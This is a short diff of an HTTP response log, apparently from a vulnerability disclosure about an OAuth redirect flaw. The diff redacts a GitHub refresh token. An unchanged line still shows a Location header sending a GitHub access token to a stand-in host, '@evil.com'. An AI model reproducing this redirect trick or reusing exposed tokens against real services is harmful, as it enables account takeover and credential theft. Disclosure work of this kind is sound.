@@ -320,7 +320,7 @@ Date: Sat, 14 May 2022 04:08:37 GMT
 Content-Type: text/html
 Location: https:// @evil.com/#%7B%22access_token%22%3A%22ghu_eEEIwuwg1GN1FwidVj4TS4pAa8plEc02asJs%22%2C%22expires_in%22%3A28800%7D
 Set-Cookie: auth-state= ;path=/github2; expires=Thu, 01 Jan 1970 00:00:00 UTC; Secure; HttpOnly; SameSite=none
-Set-Cookie: auth-tokenIv1.98d62f0431e40543=ghr_MRUNjYWPUiKUDKFlQTxcT6442q0L6l6LdWcKf9XBqeYZV3bYYhMyaX6fYJV8kuKk1WRO6Y4gQHzK; Max-Age=31536000;path=/github2; Secure; HttpOnly; SameSite=none
+Set-Cookie: auth-tokenIv1.98d62f0431e40543=REDACTED_GITHUB_REFRESH_TOKEN; Max-Age=31536000;path=/github2; Secure; HttpOnly; SameSite=none
 X-Cloud-Trace-Context: 766df5ad8123a0fa5701fc92aec830d4
 Cf-Cache-Status: DYNAMIC
 Expect-Ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
